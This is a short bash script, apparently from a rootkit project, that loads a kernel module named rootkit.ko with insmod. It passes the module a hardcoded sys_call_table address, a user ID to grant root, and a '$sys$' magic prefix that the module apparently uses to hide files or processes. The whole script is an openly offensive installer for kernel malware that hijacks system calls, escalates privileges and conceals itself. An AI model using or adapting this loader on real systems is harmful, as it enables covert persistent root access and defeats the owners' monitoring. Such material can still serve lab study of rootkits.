#!/bin/bash

#Find the sys_call_table symbol's address from the /boot/System.map
TABLE_ADDR=ffffffff81801320
root_uid=1001 # set our UID of 1001
magic_prefix="\$sys\$"
#Insert the rootkit module, providing some parameters
insmod rootkit.ko table_addr=0x$TABLE_ADDR root_uid=$root_uid magic_prefix=$magic_prefix
